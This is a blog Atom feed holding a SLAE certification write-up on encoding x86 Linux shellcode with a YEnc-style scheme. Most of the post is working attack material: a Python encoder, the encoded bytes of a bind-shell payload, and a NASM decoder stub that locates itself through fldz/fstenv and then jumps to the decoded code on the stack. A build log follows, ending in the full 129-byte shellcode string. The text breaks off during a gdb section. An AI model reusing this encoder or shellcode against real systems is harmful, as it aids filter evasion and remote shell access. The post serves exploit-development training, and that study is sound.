<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[tcunha.github.io]]></title>
  <link href="http://tcunha.github.io/atom.xml" rel="self"/>
  <link href="http://tcunha.github.io/"/>
  <updated>2018-07-14T09:26:17+00:00</updated>
  <id>http://tcunha.github.io/</id>
  <author>
    <name><![CDATA[tcunha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SLAE 0x04: Encoder]]></title>
    <link href="http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder/"/>
    <updated>2018-07-12T20:57:49+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime.</p>

<p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>

<p>Basically, the encoding process consists of for any given character, increment its ASCII value by 42, modulo 256. Next, if the resulting character is a forbidden one (0x00, 0x0a, 0x0d and 0x3d), output the escape 0x3d character and increment the previous resulting character by 64, modulo 256.</p>

<p>The encoder does not strictly follow the draft, since it will not use the header, trailer and the CRC32 checksum.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Follows YEnc draft 1.3 with regards to the encoding process. No header or</span>
</span><span class='line'><span class="c"># trailer will be used by the decoder, nor will the CRC32.</span>
</span><span class='line'><span class="c">#</span>
</span><span class='line'><span class="c"># An encoded character is equal to its original ASCII value plus 42, modulo 256.</span>
</span><span class='line'><span class="c"># In case of a special character is detected (0x00, 0x0a, 0x0d and 0x3d), the</span>
</span><span class='line'><span class="c"># resulting encoded character is prefixed with the escape 0x3d character and its</span>
</span><span class='line'><span class="c"># already encoded result (with the above) will be incremented 64, modulo 256.</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s">&quot;usage: opcodes&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Original shellcode size: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span><span class='line'><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">+</span> <span class="mi">42</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="mh">0x00</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mh">0x0a</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mh">0x0d</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="mh">0x3d</span><span class="p">:</span>
</span><span class='line'>        <span class="n">enc</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="mi">61</span><span class="p">))</span>
</span><span class='line'>        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>                  <span class="c"># critical character; double encode</span>
</span><span class='line'>    <span class="n">enc</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>                      <span class="c"># regular character</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Encoded shellcode size: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc</span><span class="p">))</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;,&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>encoder in action</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ opcodes</span><span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x01-bind/bind<span class="sb">`</span><span class="p">;</span> ./encoder.py <span class="sb">`</span><span class="nb">echo</span> -e <span class="nv">$opcodes</span><span class="sb">`</span>
</span><span class='line'>Original shellcode size: 82
</span><span class='line'>Encoded shellcode size: 83
</span><span class='line'>0x5b,0xea,0x5b,0x20,0xc3,0x90,0xe2,0x91,0x2b,0x94,0x2c,0x85,0x94,0x2b,0x83,0xf7,0xaa,0xbd,0x90,0xe2,0x93,0x2b,0x80,0x90,0x92,0x3a,0xbc,0x90,0x94,0x2c,0xb3,0xb,0x94,0x3a,0x84,0xf7,0xaa,0x90,0xe2,0x95,0x2b,0x5b,0xf3,0xf7,0xaa,0x21,0xb,0x90,0xe2,0x96,0x2b,0xf7,0xaa,0xbd,0x6b,0x6b,0x94,0x69,0x82,0xf7,0xaa,0x73,0xa3,0x22,0x7a,0xda,0x35,0x92,0x98,0x59,0x9d,0x92,0x92,0x59,0x59,0x8c,0x93,0xb3,0x3d,0x4d,0x6b,0xf7,0xaa
</span></code></pre></td></tr></table></div></figure>


<p>The resulting shellcode is using the FPU <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="(https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the shellcode. Due to the decoding process having to discard the escape characters, it is also pushing the final decoded characters to the stack instead of the data section, where it would imply having to overwrite the escape characters:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>  <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'>  <span class="nf">mul</span> <span class="no">ecx</span>                         <span class="err">;</span> <span class="no">make</span> <span class="no">eax</span> <span class="no">and</span> <span class="no">edx</span> <span class="no">zero</span><span class="p">,</span> <span class="no">as</span> <span class="no">well</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">fldz</span>                            <span class="err">;</span> <span class="no">retrieve</span> <span class="no">shellcode</span> <span class="no">address</span> <span class="no">via</span> <span class="no">fldz</span>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">decoder_pc</span>
</span><span class='line'>
</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">shellcode</span> <span class="no">address</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span> <span class="no">of</span> <span class="no">fldz</span>
</span><span class='line'>  <span class="nl">decoder_shellcode:</span> <span class="nf">db</span> <span class="no">SHELLCODE</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">get</span> <span class="no">the</span> <span class="no">shellcode</span> <span class="no">length</span> <span class="no">by</span> <span class="no">using</span> <span class="no">the</span> <span class="no">$</span> <span class="no">identifier</span> <span class="p">(</span><span class="no">which</span> <span class="no">evaluates</span> <span class="no">to</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">current</span> <span class="no">address</span><span class="p">)</span>
</span><span class='line'>  <span class="nl">decoder_length:</span> <span class="nf">equ</span> <span class="no">$</span> <span class="p">-</span> <span class="no">decoder_shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="nl">decoder_pc:</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">the</span> <span class="no">FPU</span> <span class="no">structure</span> <span class="no">in</span> <span class="no">memory</span> <span class="no">contains</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">last</span> <span class="no">FPU</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">instruction</span> <span class="no">on</span> <span class="no">byte</span> <span class="mi">0xc</span> <span class="p">(</span><span class="no">the</span> <span class="no">previous</span> <span class="mi">3</span> <span class="no">bytes</span> <span class="no">are</span> <span class="no">composed</span> <span class="no">of</span> <span class="no">the</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">control</span><span class="p">,</span> <span class="no">status</span> <span class="no">and</span> <span class="no">tag</span> <span class="no">word</span><span class="p">)</span>
</span><span class='line'>  <span class="nf">fstenv</span> <span class="err">[</span><span class="no">esp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="err">]</span>
</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'>  <span class="nf">lea</span> <span class="no">esi</span><span class="p">,</span> <span class="err">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0x4</span><span class="err">]</span>            <span class="err">;</span> <span class="no">the</span> <span class="no">shellcode</span> <span class="no">is</span> <span class="mi">4</span> <span class="no">bytes</span> <span class="no">below</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">cl</span><span class="p">,</span> <span class="no">decoder_length</span>
</span><span class='line'><span class="nl">decoder_loop:</span>
</span><span class='line'>  <span class="nf">cmp</span> <span class="no">byte</span> <span class="err">[</span><span class="no">esi</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x3d</span>            <span class="err">;</span> <span class="no">check</span> <span class="no">if</span> <span class="no">it</span> <span class="no">is</span> <span class="no">a</span> <span class="no">regular</span> <span class="no">character</span>
</span><span class='line'>  <span class="nf">jnz</span> <span class="no">decoder_regular</span>             <span class="err">;</span> <span class="no">not</span> <span class="no">an</span> <span class="no">escaped</span> <span class="no">character</span>
</span><span class='line'>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">esi</span>                         <span class="err">;</span> <span class="no">grab</span> <span class="no">the</span> <span class="no">next</span> <span class="no">character</span><span class="p">,</span> <span class="no">instead</span>
</span><span class='line'>  <span class="nf">sub</span> <span class="no">byte</span> <span class="err">[</span><span class="no">esi</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x40</span>            <span class="err">;</span> <span class="no">per</span> <span class="no">the</span> <span class="no">draft</span><span class="p">,</span> <span class="no">subtract</span> <span class="mi">0x40</span>
</span><span class='line'>  <span class="nf">dec</span> <span class="no">ecx</span>                         <span class="err">;</span> <span class="no">the</span> <span class="no">escape</span> <span class="no">character</span> <span class="no">was</span> <span class="no">skipped</span>
</span><span class='line'><span class="nl">decoder_regular:</span>
</span><span class='line'>  <span class="nf">sub</span> <span class="no">byte</span> <span class="err">[</span><span class="no">esi</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x2a</span>            <span class="err">;</span> <span class="no">per</span> <span class="no">the</span> <span class="no">draft</span><span class="p">,</span> <span class="no">subtract</span> <span class="mi">0x2a</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="err">[</span><span class="no">esi</span><span class="err">]</span>                   <span class="err">;</span> <span class="no">can</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">mov</span> <span class="no">m8</span><span class="p">,</span> <span class="no">m8</span>
</span><span class='line'>  <span class="nf">mov</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span> <span class="no">al</span>                   <span class="err">;</span> <span class="no">move</span> <span class="no">decoded</span> <span class="no">character</span> <span class="no">to</span> <span class="no">the</span> <span class="no">stack</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">esi</span>                         <span class="err">;</span> <span class="no">go</span> <span class="no">to</span> <span class="no">the</span> <span class="no">next</span> <span class="no">character</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">esp</span>                         <span class="err">;</span> <span class="no">increase</span> <span class="no">stack</span> <span class="no">for</span> <span class="no">the</span> <span class="no">next</span> <span class="no">one</span>
</span><span class='line'>  <span class="nf">inc</span> <span class="no">edx</span>                         <span class="err">;</span> <span class="no">save</span> <span class="no">number</span> <span class="no">of</span> <span class="no">copied</span> <span class="no">characters</span>
</span><span class='line'>  <span class="nf">loop</span> <span class="no">decoder_loop</span>
</span><span class='line'>
</span><span class='line'>  <span class="err">;</span> <span class="nf">before</span> <span class="no">jumping</span> <span class="no">to</span> <span class="no">the</span> <span class="no">stack</span><span class="p">,</span> <span class="no">its</span> <span class="no">pointer</span> <span class="no">needs</span> <span class="no">to</span> <span class="no">be</span> <span class="no">adjusted</span> <span class="no">by</span> <span class="no">the</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">number</span> <span class="no">of</span> <span class="no">copied</span> <span class="no">characters</span><span class="err">;</span> <span class="no">besides</span> <span class="no">this</span> <span class="no">also</span> <span class="no">avoids</span> <span class="no">the</span> <span class="no">shellcode</span>
</span><span class='line'>  <span class="err">;</span> <span class="nf">potentially</span> <span class="no">overwriting</span> <span class="no">itself</span> <span class="no">with</span> <span class="no">push</span> <span class="no">instructions</span>
</span><span class='line'>  <span class="nf">sub</span> <span class="no">esp</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>  <span class="nf">jmp</span> <span class="no">esp</span>                         <span class="err">;</span> <span class="no">finally</span> <span class="no">jump</span> <span class="no">to</span> <span class="no">the</span> <span class="no">shellcode</span>
</span></code></pre></td></tr></table></div></figure>


<p>As usual, the configure script in the base directory can be used to tweak the code. In this case, the new -s command-line option should point to the shellcode to encode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -s 0x02-reverse/reverse
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'>Using shellcode: 0x02-reverse/reverse
</span><span class='line'><span class="nv">$ </span>./configure
</span><span class='line'>Using listening port: 0x9210
</span><span class='line'>Using remote host: 0x0101017f
</span><span class='line'>Using remote port: 0x9210
</span><span class='line'>Using shellcode: 0x01-bind/bind
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x04-encoder/
</span><span class='line'><span class="nv">$ </span>make
</span><span class='line'>nasm  -f elf32 -o decoder.o decoder.asm
</span><span class='line'>ld -N -zexecstack -o decoder decoder.o
</span><span class='line'><span class="m">08048080</span> &lt;_start&gt;:
</span><span class='line'> 8048080:       <span class="m">31</span> c9                   xor    ecx,ecx
</span><span class='line'> 8048082:       f7 e1                   mul    ecx
</span><span class='line'> 8048084:       d9 ee                   fldz
</span><span class='line'> 8048086:       eb <span class="m">53</span>                   jmp    80480db &lt;decoder_pc&gt;
</span><span class='line'>
</span><span class='line'><span class="m">08048088</span> &lt;decoder_shellcode&gt;:
</span><span class='line'> 8048088:       5b                      pop    ebx
</span><span class='line'> 8048089:       ea 5b <span class="m">20</span> c3 <span class="m">90</span> e2 <span class="m">91</span>    jmp    0x91e2:0x90c3205b
</span><span class='line'> 8048090:       2b <span class="m">94</span> 2c <span class="m">85</span> <span class="m">94</span> 2b <span class="m">83</span>    sub    edx,DWORD PTR <span class="o">[</span>esp+ebp*1-0x7cd46b7b<span class="o">]</span>
</span><span class='line'> 8048097:       f7 aa bd <span class="m">90</span> e2 <span class="m">93</span>       imul   DWORD PTR <span class="o">[</span>edx-0x6c1d6f43<span class="o">]</span>
</span><span class='line'> 804809d:       2b <span class="m">80</span> <span class="m">90</span> <span class="m">92</span> 3a bc       sub    eax,DWORD PTR <span class="o">[</span>eax-0x43c56d70<span class="o">]</span>
</span><span class='line'> 80480a3:       <span class="m">90</span>                      nop
</span><span class='line'> 80480a4:       <span class="m">94</span>                      xchg   esp,eax
</span><span class='line'> 80480a5:       2c b3                   sub    al,0xb3
</span><span class='line'> 80480a7:       0b <span class="m">94</span> 3a <span class="m">84</span> f7 aa <span class="m">90</span>    or     edx,DWORD PTR <span class="o">[</span>edx+edi*1-0x6f55087c<span class="o">]</span>
</span><span class='line'> 80480ae:       e2 <span class="m">95</span>                   loop   <span class="m">8048045</span> &lt;decoder_length+0x8047ff2&gt;
</span><span class='line'> 80480b0:       2b 5b f3                sub    ebx,DWORD PTR <span class="o">[</span>ebx-0xd<span class="o">]</span>
</span><span class='line'> 80480b3:       f7 aa <span class="m">21</span> 0b <span class="m">90</span> e2       imul   DWORD PTR <span class="o">[</span>edx-0x1d6ff4df<span class="o">]</span>
</span><span class='line'> 80480b9:       <span class="m">96</span>                      xchg   esi,eax
</span><span class='line'> 80480ba:       2b f7                   sub    esi,edi
</span><span class='line'> 80480bc:       aa                      stos   BYTE PTR es:<span class="o">[</span>edi<span class="o">]</span>,al
</span><span class='line'> 80480bd:       bd 6b 6b <span class="m">94</span> <span class="m">69</span>          mov    ebp,0x69946b6b
</span><span class='line'> 80480c2:       <span class="m">82</span> f7 aa                xor    bh,0xaa
</span><span class='line'> 80480c5:       <span class="m">73</span> a3                   jae    804806a &lt;decoder_length+0x8048017&gt;
</span><span class='line'> 80480c7:       <span class="m">22</span> 7a da                and    bh,BYTE PTR <span class="o">[</span>edx-0x26<span class="o">]</span>
</span><span class='line'> 80480ca:       <span class="m">35</span> <span class="m">92</span> <span class="m">98</span> <span class="m">59</span> 9d          xor    eax,0x9d599892
</span><span class='line'> 80480cf:       <span class="m">92</span>                      xchg   edx,eax
</span><span class='line'> 80480d0:       <span class="m">92</span>                      xchg   edx,eax
</span><span class='line'> 80480d1:       <span class="m">59</span>                      pop    ecx
</span><span class='line'> 80480d2:       <span class="m">59</span>                      pop    ecx
</span><span class='line'> 80480d3:       8c <span class="m">93</span> b3 3d 4d 6b       mov    WORD PTR <span class="o">[</span>ebx+0x6b4d3db3<span class="o">]</span>,ss
</span><span class='line'> 80480d9:       f7                      .byte 0xf7
</span><span class='line'> 80480da:       aa                      stos   BYTE PTR es:<span class="o">[</span>edi<span class="o">]</span>,al
</span><span class='line'>
</span><span class='line'>080480db &lt;decoder_pc&gt;:
</span><span class='line'> 80480db:       9b d9 <span class="m">74</span> <span class="m">24</span> f4          fstenv <span class="o">[</span>esp-0xc<span class="o">]</span>
</span><span class='line'> 80480e0:       <span class="m">58</span>                      pop    eax
</span><span class='line'> 80480e1:       8d <span class="m">70</span> <span class="m">04</span>                lea    esi,<span class="o">[</span>eax+0x4<span class="o">]</span>
</span><span class='line'> 80480e4:       b1 <span class="m">53</span>                   mov    cl,0x53
</span><span class='line'>
</span><span class='line'>080480e6 &lt;decoder_loop&gt;:
</span><span class='line'> 80480e6:       <span class="m">80</span> 3e 3d                cmp    BYTE PTR <span class="o">[</span>esi<span class="o">]</span>,0x3d
</span><span class='line'> 80480e9:       <span class="m">75</span> <span class="m">05</span>                   jne    80480f0 &lt;decoder_regular&gt;
</span><span class='line'> 80480eb:       <span class="m">46</span>                      inc    esi
</span><span class='line'> 80480ec:       <span class="m">80</span> 2e <span class="m">40</span>                sub    BYTE PTR <span class="o">[</span>esi<span class="o">]</span>,0x40
</span><span class='line'> 80480ef:       <span class="m">49</span>                      dec    ecx
</span><span class='line'>
</span><span class='line'>080480f0 &lt;decoder_regular&gt;:
</span><span class='line'> 80480f0:       <span class="m">80</span> 2e 2a                sub    BYTE PTR <span class="o">[</span>esi<span class="o">]</span>,0x2a
</span><span class='line'> 80480f3:       8a <span class="m">06</span>                   mov    al,BYTE PTR <span class="o">[</span>esi<span class="o">]</span>
</span><span class='line'> 80480f5:       <span class="m">88</span> <span class="m">04</span> <span class="m">24</span>                mov    BYTE PTR <span class="o">[</span>esp<span class="o">]</span>,al
</span><span class='line'> 80480f8:       <span class="m">46</span>                      inc    esi
</span><span class='line'> 80480f9:       <span class="m">44</span>                      inc    esp
</span><span class='line'> 80480fa:       <span class="m">42</span>                      inc    edx
</span><span class='line'> 80480fb:       e2 e9                   loop   80480e6 &lt;decoder_loop&gt;
</span><span class='line'> 80480fd:       <span class="m">29</span> d4                   sub    esp,edx
</span><span class='line'> 80480ff:       ff e4                   jmp    esp
</span><span class='line'>Shellcode size: 129
</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>f7<span class="se">\x</span>e1<span class="se">\x</span>d9<span class="se">\x</span>ee<span class="se">\x</span>eb<span class="se">\x</span>53<span class="se">\x</span>5b<span class="se">\x</span>ea<span class="se">\x</span>5b<span class="se">\x</span>20<span class="se">\x</span>c3<span class="se">\x</span>90<span class="se">\x</span>e2<span class="se">\x</span>91<span class="se">\x</span>2b<span class="se">\x</span>94<span class="se">\x</span>2c<span class="se">\x</span>85<span class="se">\x</span>94<span class="se">\x</span>2b<span class="se">\x</span>83<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>bd<span class="se">\x</span>90<span class="se">\x</span>e2<span class="se">\x</span>93<span class="se">\x</span>2b<span class="se">\x</span>80<span class="se">\x</span>90<span class="se">\x</span>92<span class="se">\x</span>3a<span class="se">\x</span>bc<span class="se">\x</span>90<span class="se">\x</span>94<span class="se">\x</span>2c<span class="se">\x</span>b3<span class="se">\x</span>0b<span class="se">\x</span>94<span class="se">\x</span>3a<span class="se">\x</span>84<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>90<span class="se">\x</span>e2<span class="se">\x</span>95<span class="se">\x</span>2b<span class="se">\x</span>5b<span class="se">\x</span>f3<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>21<span class="se">\x</span>0b<span class="se">\x</span>90<span class="se">\x</span>e2<span class="se">\x</span>96<span class="se">\x</span>2b<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>bd<span class="se">\x</span>6b<span class="se">\x</span>6b<span class="se">\x</span>94<span class="se">\x</span>69<span class="se">\x</span>82<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>73<span class="se">\x</span>a3<span class="se">\x</span>22<span class="se">\x</span>7a<span class="se">\x</span>da<span class="se">\x</span>35<span class="se">\x</span>92<span class="se">\x</span>98<span class="se">\x</span>59<span class="se">\x</span>9d<span class="se">\x</span>92<span class="se">\x</span>92<span class="se">\x</span>59<span class="se">\x</span>59<span class="se">\x</span>8c<span class="se">\x</span>93<span class="se">\x</span>b3<span class="se">\x</span>3d<span class="se">\x</span>4d<span class="se">\x</span>6b<span class="se">\x</span>f7<span class="se">\x</span>aa<span class="se">\x</span>9b<span class="se">\x</span>d9<span class="se">\x</span>74<span class="se">\x</span>24<span class="se">\x</span>f4<span class="se">\x</span>58<span class="se">\x</span>8d<span class="se">\x</span>70<span class="se">\x</span>04<span class="se">\x</span>b1<span class="se">\x</span>53<span class="se">\x</span>80<span class="se">\x</span>3e<span class="se">\x</span>3d<span class="se">\x</span>75<span class="se">\x</span>05<span class="se">\x</span>46<span class="se">\x</span>80<span class="se">\x</span>2e<span class="se">\x</span>40<span class="se">\x</span>49<span class="se">\x</span>80<span class="se">\x</span>2e<span class="se">\x</span>2a<span class="se">\x</span>8a<span class="se">\x</span>06<span class="se">\x</span>88<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>46<span class="se">\x</span>44<span class="se">\x</span>42<span class="se">\x</span>e2<span class="se">\x</span>e9<span class="se">\x</span>29<span class="se">\x</span>d4<span class="se">\x</span>ff<span class="se">\x</span>e4
</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes decoder<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</span></code></pre></td></tr></table></div></figure>


<p>Debugging with gdb(1) shows that the absolute address of the shellcode is correctly retrieved, since the address of the last FPU instruction is 0x08048084, thus putting the encoded shellcode 4 bytes below in 0x08048088:</p>

<figure class='code'><figcaption><span>debugging with gdb(1)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
